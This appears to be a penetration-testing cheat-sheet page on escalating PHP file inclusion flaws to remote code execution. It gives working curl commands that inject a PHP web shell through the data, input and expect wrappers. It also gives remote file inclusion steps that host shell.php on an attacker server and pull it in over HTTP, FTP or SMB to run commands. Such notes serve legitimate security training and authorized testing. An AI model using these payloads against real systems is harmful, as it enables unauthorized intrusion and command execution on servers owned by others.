---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# RCE

## PHP Wrappers

### allow\_url\_include

The [data](rce.md#data) and [input](rce.md#input) wrappers depend on the PHP configuration `allow_url_include` (disabled by default). The PHP config file is under:

* `/etc/php/X.Y/apache2/php.ini` for Apache
* `/etc/php/X.Y/fpm/php.ini` for Nginx

{% code overflow="wrap" %}
```shell
# Using LFI & the PHP filter to read the configuration file
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
# Searching for the allow_url_include option
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```
{% endcode %}

### Data

The [data wrapper](https://www.php.net/manual/en/wrappers.data.php) can be used to include external data.

{% code overflow="wrap" %}
```shell
# Encoding a basic PHP web shell (base64 -> URL)
echo '<?php system($_GET["cmd"]); ?>' | base64 | jq -sRr @uri
# Using the data wrapper to decode the string and get RCE
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```
{% endcode %}

### Input

The difference between the [input](https://www.php.net/manual/en/wrappers.php.php) and the data wrapper is that for the former, the vulnerable parameter must also accept `POST` requests. If the function only accepts `POST` requests, we can create a static webshell by putting the command directly within the PHP code.

{% code overflow="wrap" %}
```shell
# Getting RCE with the input wrapper (GET & POST)
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
# Getting RCE with the input wrapper (POST only)
curl -s -X POST --data '<?php system("id"); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```
{% endcode %}

### Expect

The  [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper is an external wrapper, i.e., it need to be manually installed and enabled, which allows us to directly run command through URL streams. We can check if that is the case similarly to the [`allow_url_include`](rce.md#allow\_url\_include) and grepping for `expect.`

{% code overflow="wrap" %}
```shell
# Checking if the except extension is installed
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
# Getting RCE using expect
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
{% endcode %}

## RFI

If the vulnerable function allows the inclusion of remote URLs, then we can also perform a RFI[^1] attack, which allows for gaining RCE by including a malicious script that we host and enumerating local-only ports.

| Function                     | Read Content | Execute | Remote URL |
| ---------------------------- | :----------: | :-----: | :--------: |
| **PHP**                      |              |         |            |
| `include()`/`include_once()` |       ✅      |    ✅    |      ✅     |
| `file_get_contents()`        |       ✅      |    ❌    |      ✅     |
| **Java**                     |              |         |            |
| `import`                     |       ✅      |    ✅    |      ✅     |
| **.NET**                     |              |         |            |
| `@Html.RemotePartial()`      |       ✅      |    ❌    |      ✅     |
| `include`                    |       ✅      |    ✅    |      ✅     |

In the case that a function allows remote URLs but does not allow code execution, we can exploit the vulnerability to enumerate local ports through [SSRF](../ssrf-to-lfi.md).

### Identify

A reliable way to determine whether an LFI flaw is also an RFI one is to try and include a local URL (for ensuring that does not get blocked by security measures) and see if we can get its content.

```html
<!-- Requesting a local URL -->
/index.php?language=http://127.0.0.1:80/index.php
```

If the `index.php` page gets included and executed, i.e., rendered -> RFI + RCE.

### RCE

#### HTTP

{% code overflow="wrap" %}
```shell
# Creating a webshell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Serving the webshell via an HTTP server
sudo python3 -m http.server [80 | 443]
# RCE
curl http://<ip:port>/index.php?language=http://<attacker-ip:port>/shell.php&cmd=id
```
{% endcode %}

#### FTP

This may be useful in case HTTP ports are blocked or the `http://` string gets blocked by a WAF. By default, PHP tries to authenticate as an anonymous user.

{% code overflow="wrap" %}
```shell
# Serving the webshell via an FTP server
sudo python -m pyftpdlib -p 21
# RCE
curl http://<ip:port>/index.php?language=ftp://<attacker-ip>/shell.php&cmd=id
# If authentication is required
curl 'http://<ip:port>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
```
{% endcode %}

#### SMB

If the web application is hosted on a Windows server we can utilize the SMB protocol for the remote file inclusion, as Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path. This technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default.

```shell
# Serving the webshell via an SMB server
impacket-smbserver -smb2support share $(pwd)
# RCE
curl http://<ip:port>/index.php?language=\\<attacker-ip>\share\shell.php&cmd=whoami
```



[^1]: Remote File Inclusion
